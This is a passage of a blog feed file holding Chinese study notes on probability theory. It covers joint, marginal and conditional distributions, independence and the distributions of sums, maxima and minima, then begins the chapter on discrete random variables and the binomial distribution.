的分布律与分布函数.</p></blockquote><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_CB9hMC7Ixp.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_rtX_fvpzK1.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_Cr7hPqeYMq.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_GKfcYz5cYl.png"></p><p>所以( X ,Y ) 的分布函数为：</p><p>$$<br>F(x, y)&#x3D;\left{\begin{array}{ll}0, &amp; x&lt;1, \text { 或 } y&lt;1, \text { 或 } \ &amp; 1 \leq x&lt;2,1 \leq y&lt;2 \ \frac{1}{3}, &amp; 1 \leq x&lt;2, y&gt;2, \text { 或 } \ &amp; x&gt;2,1 \leq y&lt;2 \ 1, &amp; x \geq 2, y \geq 2\end{array}\right.<br>$$</p><h2 id="1-3-二维连续型随机变量"><a href="#1-3-二维连续型随机变量" class="headerlink" title="1.3 二维连续型随机变量"></a>1.3 二维连续型随机变量</h2><p>定义4：对于二维随机变量(X,Y)的分布函数F(X,Y) ，如果存在非负可积的函数 f(x,y),使对于任意 x, y 有</p><p>$$<br>F(x, y)&#x3D;\int_{-\infty}^{y} \int_{-\infty}^{x} f(u, v) \mathrm{d} u \mathrm{~d} v<br>$$</p><p>则称(X,Y)是连续型的二维随机变量,函数 f(x,y) 称为二维随机变量(X,Y)的概率密度, 或称为随机变量 X 和 Y 的联合概率密度。</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_OQAEr5ep6_.png"></p><p>说明：</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_Bb05Fw9wre.png"></p><h2 id="1-4-小结"><a href="#1-4-小结" class="headerlink" title="1.4 小结"></a>1.4 小结</h2><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_3IRd4UJ86V.png"></p><hr><h1 id="2-边缘分布"><a href="#2-边缘分布" class="headerlink" title="2 边缘分布"></a>2 边缘分布</h1><h2 id="2-1-边缘分布函数"><a href="#2-1-边缘分布函数" class="headerlink" title="2.1 边缘分布函数"></a>2.1 边缘分布函数</h2><p>二维随机变量 (X,Y)作为一个整体，具有分布函数$F(x, y)$，而X和Y都是随机变量，也有各自的分布函数，分别记为$F_{X}(x)$和$F_{Y}(y)$，依次称为二维随机变量(X, Y)关于X和Y的边缘分布函数。</p><p>$$<br>\begin{array}{l}F_{X}(x)&#x3D;P{X \leq x}&#x3D;P{X \leq x, Y&lt;+\infty}&#x3D;F(x,+\infty) \ F_{Y}(y)&#x3D;P{Y \leq y}&#x3D;P{X&lt;+\infty, Y \leq y}&#x3D;F(+\infty, y)\end{array}<br>$$</p><h2 id="2-2-离散型随机变量的边缘分布律"><a href="#2-2-离散型随机变量的边缘分布律" class="headerlink" title="2.2 离散型随机变量的边缘分布律"></a>2.2 离散型随机变量的边缘分布律</h2><p>二维随机变量 (X,Y) 关于X 的边缘分布律为：</p><p>$$<br>\begin{aligned} P\left{X&#x3D;x_{i}\right} &amp; &#x3D;\sum_{j&#x3D;1}^{+\infty} P\left{X&#x3D;x_{i}, Y&#x3D;y_{j}\right} \ &amp; &#x3D;\sum_{j&#x3D;1}^{\infty} p_{i j} \triangleq p_{i} \cdot(i&#x3D;1,2, \cdots)\end{aligned}<br>$$</p><p>(X,Y) 关于 Y 的边缘分布律为：</p><p>$$<br>\begin{aligned} P\left{Y&#x3D;y_{j}\right} &amp; &#x3D;\sum_{i&#x3D;1}^{\infty} P\left{X&#x3D;x_{i}, Y&#x3D;y_{j}\right} \ &amp; &#x3D;\sum_{i&#x3D;1}^{\infty} p_{i j} \triangleq p_{\cdot j} \quad(j&#x3D;1,2, \cdots)\end{aligned}<br>$$</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_UfrdrIQmNs.png"></p><p>离散型随机变量关于X 和Y 的边缘分布函数分别为：</p><p>$$<br>F_{X}(x)&#x3D;F(x, \infty)&#x3D;P{X \leq x, Y&lt;\infty}&#x3D;\sum_{x_{i} \leq x} \sum_{j&#x3D;1}^{\infty} p_{i j}<br>$$</p><p>$$<br>F_{Y}(y)&#x3D;F(\infty, y)&#x3D;P{X &lt; \infty, Y\leq y}&#x3D;\sum_{y_{j} \leq y} \sum_{i&#x3D;1}^{\infty} p_{i j}<br>$$</p><p><strong>注意</strong>：已知两个变量的联合分布可以推导出每个变量的边缘分布，但是已知边缘分布不能推导出联合分布。</p><h2 id="2-3-连续型随机变量的边缘分布"><a href="#2-3-连续型随机变量的边缘分布" class="headerlink" title="2.3 连续型随机变量的边缘分布"></a>2.3 连续型随机变量的边缘分布</h2><p><strong>定义1</strong>：对于连续型随机变量(X, Y)，设它的概率密度为f(x, y)，由于</p><p>$$<br>F_{X}(x)&#x3D;F(x, \infty)&#x3D;\int_{-\infty}^{x}\left[\int_{-\infty}^{\infty} f(x, y) \mathrm{d} y\right] \mathrm{d} x<br>$$</p><p>则$f_{X}(x)&#x3D;\int_{-\infty}^{\infty} f(x, y) \mathrm{d} y$。   称为随机变量(X, Y)关于X的边缘概率密度。</p><p>Y  的边缘概率密度：$f_{Y}(y)&#x3D;\int_{-\infty}^{+\infty} f(x, y) \mathrm{d} x$</p><hr><h1 id="3-条件分布"><a href="#3-条件分布" class="headerlink" title="3 条件分布"></a>3 条件分布</h1><h2 id="3-1-离散型随机变量的条件分布"><a href="#3-1-离散型随机变量的条件分布" class="headerlink" title="3.1 离散型随机变量的条件分布"></a>3.1 离散型随机变量的条件分布</h2><p>定义1    设 ( X, Y ) 是二维离散型随机变量，对于固定的 j，若 P{Y &#x3D; yj } &gt; 0，则称</p><p>$$<br>\boldsymbol{P}\left{\mathbf{X}&#x3D;\boldsymbol{x}<em>{i} \mid Y&#x3D;y</em>{j}\right}&#x3D;\frac{P\left{X&#x3D;x_{i}, Y&#x3D;y_{j}\right}}{P\left{Y&#x3D;y_{j}\right}}&#x3D;\frac{p_{i j}}{p_{\bullet j}} \quad i&#x3D;\mathbf{1 , 2}, \ldots<br>$$</p><p>为在Y &#x3D; yj 条件下随机变量X的条件分布律。</p><p>类似地，在X&#x3D;xi的条件下随机变量Y的条件分布律为：</p><p>$$<br>P\left{Y&#x3D;y_{j} \mid X&#x3D;x_{i}\right}&#x3D;\frac{P\left{X&#x3D;x_{i}, Y&#x3D;y_{j}\right}}{P\left{X&#x3D;x_{i}\right}}&#x3D;\frac{p_{i j}}{p_{i \bullet}}<br>$$</p><h2 id="3-2-连续型随机变量的条件分布"><a href="#3-2-连续型随机变量的条件分布" class="headerlink" title="3.2 连续型随机变量的条件分布"></a>3.2 连续型随机变量的条件分布</h2><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_Tea9ihNcn_.png"></p><p>$$<br>P{X \leq x \mid Y&#x3D;y}&#x3D;F_{X \mid Y}(x \mid y)&#x3D;\int_{-\infty}^{x} \frac{f(x, y)}{f_{Y}(y)} d x<br>$$</p><p>为在Y&#x3D;y的条件下, X的条件分布函数，类似地，可以定义：</p><p>$$<br>f_{Y \mid X}(y \mid x)&#x3D;\frac{f(x, y)}{f_{X}(x)} \quad F_{Y \mid X}(y \mid x)&#x3D;\int_{-\infty}^{y} \frac{f(x, y)}{f_{X}(x)} d y<br>$$</p><blockquote><p>例3 设(X,Y)服从单位圆上的均匀分布，概率密度为$f(x, y)&#x3D;\left{\begin{array}{cc}\frac{1}{\pi}, &amp; x^{2}+y^{2} \leq 1 \ 0, &amp; \text { 其它 }\end{array}\right.$，求$f_{Y \mid X}(y \mid x)$</p></blockquote><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_BszmSr6JKM.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_l5joiYAx9g.png"></p><h3 id="3-2-1-二维均匀分布-xD"><a href="#3-2-1-二维均匀分布-xD" class="headerlink" title="3.2.1 二维均匀分布&#xD;"></a>3.2.1 二维均匀分布&#xD;</h3><p>设G是平面上的有界区域，其面积为A. 若二维随机变量（ X, Y）具有概率密度</p><p>$$<br>f(x, y)&#x3D;\left{\begin{array}{cc}\frac{1}{\boldsymbol{A}}, &amp; (\boldsymbol{x}, \boldsymbol{y}) \in \boldsymbol{G} \ 0, &amp; \text { 其它 }\end{array}\right.<br>$$</p><p>则称（X,Y）在G上服从均匀分布。</p><p>向平面上有界区域G上任投一质点，若质点落在G内任一小区域B的概率与小区域的面积成正比，而与B的形状及位置无关, 则质点的坐标 (X,Y)在G上服从均匀分布.</p><hr><h1 id="4-相互独立的随机变量"><a href="#4-相互独立的随机变量" class="headerlink" title="4 相互独立的随机变量"></a>4 相互独立的随机变量</h1><h2 id="4-1-随机变量相互独立的定义"><a href="#4-1-随机变量相互独立的定义" class="headerlink" title="4.1 随机变量相互独立的定义"></a>4.1 随机变量相互独立的定义</h2><p><strong>定义1</strong>：设 X,Y是两个随机变量，若对任意的x, y, 有$P{X \leq x, Y \leq y}&#x3D;P{X \leq x} P{Y \leq y}$，则称 X 和 Y 相互独立。</p><p>用分布函数表示，设 X,Y是两个随机变量，若对任意的x, y, 有$F(x, y)&#x3D;F_{X}(x) F_{Y}(y)$，则称X和Y相互独立。</p><h3 id="4-1-1-结论"><a href="#4-1-1-结论" class="headerlink" title="4.1.1 结论"></a>4.1.1 结论</h3><p>（1）若 (X,Y)是连续型机变量，则上述独立性的定义等价于，对任意的 x, y,  有$f(x, y)&#x3D;f_{X}(x) f_{Y}(y)$，几乎处处成立，则称 X 和 Y 相互独立 .</p><p>这里“几乎处处成立”的含义是：在平面上除去面积为 0 的集合外，处处成立.</p><p>（2）若 (X,Y)是离散型机变量，则上述独立性的定义等价于，对(X,Y)的所有可能取值(xi, yj),有</p><p>$$<br>P\left{X&#x3D;x_{i}, Y&#x3D;y_{j}\right}&#x3D;P\left{X&#x3D;x_{i}\right} P\left{Y&#x3D;y_{j}\right}<br>$$</p><p>则称 X 和Y 相互独立.</p><p>（3）X和Y相互独立，则f(x)和g(y)也相互独立。</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_vSU0dm90oe.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_OnKB2bsbJo.png"></p><hr><h1 id="5-两个随机变量的函数的分布"><a href="#5-两个随机变量的函数的分布" class="headerlink" title="5 两个随机变量的函数的分布"></a>5 两个随机变量的函数的分布</h1><h2 id="5-1-Z-X-Y的分布"><a href="#5-1-Z-X-Y的分布" class="headerlink" title="5.1 Z&#x3D;X+Y的分布"></a>5.1 Z&#x3D;X+Y的分布</h2><h3 id="5-1-1-离散型"><a href="#5-1-1-离散型" class="headerlink" title="5.1.1 离散型"></a>5.1.1 离散型</h3><p>若 X、Y 独立，P(X&#x3D;k)&#x3D;ak, P(Y&#x3D;k)&#x3D;bk, k&#x3D;0,1,2,…, 则Z&#x3D;X+Y 的分布律为</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_6esw1PfrwN.png"></p><blockquote><p>$例1   若 \boldsymbol{X} 和 \boldsymbol{Y} 相互独立, 它们分别服从参数为 \lambda_{1}, \lambda_{2}的泊松分布, 则 Z&#x3D;X+Y 服从参数为 \lambda_{1}+\lambda_{2} 的泊松分布.$</p></blockquote><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_867DLq9Jrx.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_4MvjwkvJvw.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_1ZORLEXWAc.png"></p><h3 id="5-1-2-连续型-xD"><a href="#5-1-2-连续型-xD" class="headerlink" title="5.1.2 连续型&#xD;"></a>5.1.2 连续型&#xD;</h3><p>设X和Y的联合密度为 f (x, y), 则 Z&#x3D;X+Y 的概率密度函数为  &#x20;</p><p>$$<br>\begin{aligned} f_{Z}(z)&#x3D;f_{X+Y}(z) &amp; &#x3D;\int_{-\infty}^{\infty} f(z-y, y) d y \ &amp; &#x3D;\int_{-\infty}^{\infty} f(x, z-x) d x\end{aligned}<br>$$</p><p>以上两式即是两个随机变量和的概率密度的一般公式.</p><p>特别地，当 X 和 Y 独立，设 (X,Y) 关于 X, Y 的边缘密度分别为 fX(x) , fY(y) ,  则：</p><p>$$<br>\left{\begin{array}{l}f_{Z}(z)&#x3D;\int_{-\infty}^{\infty} f_{X}(z-y) f_{Y}(y) \mathrm{d} y \ f_{Z}(z)&#x3D;\int_{-\infty}^{\infty} f_{X}(x) f_{Y}(z-x) \mathrm{d} x\end{array}\right.<br>$$</p><p>$上式称为 f_{X}, f_{Y} 卷积公式, 记为 f_{X} * f_{Y}$。</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_L2nrexKfaX.png"></p><p>有限个独立正态变量的线性组合仍然服从正态分布， 即$若 X_{i} \sim N\left(\mu_{i}, \sigma_{i}^{2}\right), i&#x3D;1,2, \cdots, n 相互独立, 则$</p><p>$$<br>\sum_{i&#x3D;1}^{n} k_{i} X_{i} \sim N\left(\sum_{i&#x3D;1}^{n} k_{i} \mu_{i}, \sum_{i&#x3D;1}^{n} k_{i}^{2} \sigma_{i}^{2}\right)<br>$$</p><h2 id="5-2-Z-Y-X-Z-XY的分布"><a href="#5-2-Z-Y-X-Z-XY的分布" class="headerlink" title="5.2 Z&#x3D;Y&#x2F;X,  Z&#x3D;XY的分布"></a>5.2 Z&#x3D;Y&#x2F;X,  Z&#x3D;XY的分布</h2><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_nV1RjOl7lm.png"></p><h2 id="5-3-M-max-X-Y-的分布"><a href="#5-3-M-max-X-Y-的分布" class="headerlink" title="5.3 M&#x3D;max(X,Y)的分布"></a>5.3 M&#x3D;max(X,Y)的分布</h2><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_kipBhq65lT.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_fK8nzUvWxN.png"></p><h2 id="5-4-N-min-X-Y-的分布"><a href="#5-4-N-min-X-Y-的分布" class="headerlink" title="5.4 N&#x3D;min(X,Y) 的分布"></a>5.4 N&#x3D;min(X,Y) 的分布</h2><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_D8RIbf_0zH.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E5%A4%9A%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_sEZWxrfFfe.png"></p><hr><h1 id="6-本章总结"><a href="#6-本章总结" class="headerlink" title="6 本章总结"></a>6 本章总结</h1><ol><li><p>二维随机变量的分布、分布律、概率密度；</p></li><li><p>边缘分布（离散型、连续型）；</p></li><li><p>条件分布（离散型、连续型）；</p></li><li><p>两个随机变量相互独立得出的4个公式；</p></li><li><p>两个随机变量的函数的分布（5种函数）；</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论第2章：随机变量及其分布</title>
      <link href="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/"/>
      <url>/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<h1 id="1-随机变量"><a href="#1-随机变量" class="headerlink" title="1 随机变量"></a>1 随机变量</h1><h2 id="1-1-随机变量概念的产生"><a href="#1-1-随机变量概念的产生" class="headerlink" title="1.1 随机变量概念的产生"></a>1.1 随机变量概念的产生</h2><p>在实际问题中，随机试验的结果可以用数量来表示，由此就产生了随机变量的概念。</p><ol><li>有些试验结果本身与数值有关（本身就是一个数）.</li><li>在有些试验中，试验结果看来与数值无关，但我们可以引进一个变量来表示它的各种结果. 也就是说，把试验结果数值化.     &#x20;</li></ol><p>这种对应关系在数学上理解为定义了一种实值单值函数.</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_7b3qNk2sRI.png"></p><h2 id="1-2-随机变量的定义"><a href="#1-2-随机变量的定义" class="headerlink" title="1.2 随机变量的定义"></a>1.2 随机变量的定义</h2><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_ajts7w3si_.png"></p><p>说明：实值单值函数随试验结果的不同而取不同的值，因而在试验之前只知道它可能取值的范围，而不能预先肯定它将取哪个值。</p><p>随机变量通常用大写字母X, Y, Z, W, N 等表示；随机变量所取的值,一般采用小写字母 x, y, z, w, n等。</p><h3 id="1-2-1-引入随机变量的意义"><a href="#1-2-1-引入随机变量的意义" class="headerlink" title="1.2.1 引入随机变量的意义"></a>1.2.1 引入随机变量的意义</h3><p>有了随机变量，随机试验中的各种事件，就可以通过随机变量的关系式表达出来.</p><p>如：每小时查看手机的次数，用X表示，它是一个随机变量.&#x20;</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_pIXnYNbPeP.png"></p><p>由于试验结果的出现具有一定的概率，随机变量的取值也有一定的概率。</p><p>随机变量概念的产生是概率论发展史上的重大事件。引入随机变量后，对随机现象统计规律的研究，就由对事件及事件概率的研究扩大为对随机变量及其取值规律的研究。</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_Yat8wAbcjx.png"></p><h2 id="1-3-随机变量的分类"><a href="#1-3-随机变量的分类" class="headerlink" title="1.3 随机变量的分类"></a>1.3 随机变量的分类</h2><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_X_cbg0RIKV.png"></p><ol><li><strong>离散型</strong>：随机变量所取的可能值是有限多个或无限可列个, 叫做离散型随机变量.</li><li><strong>连续型</strong>：随机变量所取的可能值可以连续地充满某个区间, 叫做连续型随机变量.</li></ol><hr><h1 id="2-离散型随机变量及其分布律"><a href="#2-离散型随机变量及其分布律" class="headerlink" title="2 离散型随机变量及其分布律"></a>2 离散型随机变量及其分布律</h1><h2 id="2-1-离散型随机变量分布律的定义"><a href="#2-1-离散型随机变量分布律的定义" class="headerlink" title="2.1 离散型随机变量分布律的定义"></a>2.1 离散型随机变量分布律的定义</h2><p><strong>定义1</strong>：若随机变量X的所有可能取值是有限多个或可列无限多个，这种随机变量称为<strong>离散型随机变量</strong>。</p><p><strong>定义2</strong>：设 $x_k (k&#x3D;1,2, …)$ 是离散型随机变量 X 所取的一切可能值，称</p><p>$$<br>P \{ X &#x3D; x_k \} &#x3D; p_k, \quad k&#x3D;1,2, \cdots<br>$$</p><p>为离散型随机变量 X 的分布律。</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_mnkSvdKJe4.png"></p><h2 id="2-2-离散型随机变量分布律表示方法"><a href="#2-2-离散型随机变量分布律表示方法" class="headerlink" title="2.2 离散型随机变量分布律表示方法"></a>2.2 离散型随机变量分布律表示方法</h2><h3 id="2-2-1-公式法-xD"><a href="#2-2-1-公式法-xD" class="headerlink" title="2.2.1 公式法&#xD;"></a>2.2.1 公式法&#xD;</h3><p>$$<br>{P}\{X&#x3D;x_{k}\}&#x3D;p_{k}, \quad k&#x3D;1,2, \cdots<br>$$</p><h3 id="2-2-2-列表法"><a href="#2-2-2-列表法" class="headerlink" title="2.2.2 列表法"></a>2.2.2 列表法</h3><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_Y4xo0Lfcia.png"></p><blockquote><p>例1 ：一辆汽车开往目的地需要经过四组信号灯，每组信号灯以p的概率允许或禁止汽车通过。以X表示汽车首次停下时已经过的信号灯的组数（各信号灯之间相互独立），求X的分布律。</p></blockquote><p>解：设p为每组信号灯禁止汽车通过的概率，X的分布律为：</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_MpxRi63Pxo.png"></p><p>$$<br>P{X&#x3D;k}&#x3D;(1-p)^{k} p, \quad k&#x3D;0,1,2,3<br>$$</p><h2 id="2-3-几种常见分布"><a href="#2-3-几种常见分布" class="headerlink" title="2.3 几种常见分布"></a>2.3 几种常见分布</h2><h3 id="2-3-1-两点分布"><a href="#2-3-1-两点分布" class="headerlink" title="2.3.1 两点分布"></a>2.3.1 两点分布</h3><p>设随机变量 $X$ 只可能取0与1两个值 , 它的分布律为：</p><p>$$<br>P{X&#x3D;k}&#x3D;p^{k}(1-p)^{1-k}, k&#x3D;0,1<br>$$</p><table><thead><tr><th align="center">X</th><th align="center">0</th><th align="center">1</th></tr></thead><tbody><tr><td align="center">$p_k$</td><td align="center">$1-p$</td><td align="center">$p$</td></tr></tbody></table><p>则称 $X$ 服从$ (0—1)$ 分布或两点分布。</p><blockquote><p>例2：200件产品中, 有190件合格品, 10件不合格品, 现从中随机抽取一件, 那么，若规定$X&#x3D;\begin{array}{l}1, \text { 取得不合格品, } \ 0, \text { 取得合格品. }\end{array}$，则随机变量 X 服从(0 -1)分布。</p></blockquote><table><thead><tr><th align="center">X</th><th align="center">0</th><th align="center">1</th></tr></thead><tbody><tr><td align="center">$p_k$</td><td align="center">$\frac{190}{200}$</td><td align="center">$\frac{10}{200}$</td></tr></tbody></table><h3 id="2-3-2-等可能分布"><a href="#2-3-2-等可能分布" class="headerlink" title="2.3.2 等可能分布"></a>2.3.2 等可能分布</h3><p>如果随机变量 X 的分布律为：</p><table><thead><tr><th align="center">X</th><th align="center">$a_1$</th><th align="center">$a_2$</th><th align="center">···</th><th align="center">$a_n$</th></tr></thead><tbody><tr><td align="center">$p_k$</td><td align="center">$\frac{1}{n}$</td><td align="center">$\frac{1}{n}$</td><td align="center">$\frac{1}{n}$</td><td align="center">$\frac{1}{n}$</td></tr></tbody></table><p>$其中 \left(a_{i} \neq a_{j}\right),(i \neq j), 则称 X 服从等可能分布.$</p><h3 id="2-3-3-伯努利试验和二项分布"><a href="#2-3-3-伯努利试验和二项分布" class="headerlink" title="2.3.3 伯努利试验和二项分布"></a>2.3.3 伯努利试验和二项分布</h3><p>一般地，设在一次试验E中我们只考虑两个互逆的结果：$A$ 或 $\bar{A}$ .</p><ol><li>掷骰子：“掷出4点”，“未掷出4点”</li><li>抽验产品：“是正品”，“是次品”</li></ol><p>这样的试验$E$称为伯努利试验。</p><p>将伯努利试验$E$独立地重复地进行$n$次,则称这一串重复的独立试验为$n$重伯努利试验 .</p><ul><li><strong>重复</strong>是指这 $n$ 次试验中$P(A)&#x3D; p $保持不变.</li><li><strong>独立</strong>是指各次试验的结果互不影响 .</li></ul><p>因此$A$在$n$次试验中发生$k$次的概率为：</p><p>$$<br>C_{n}^{k} p^{k}(1-p)^{n-k} 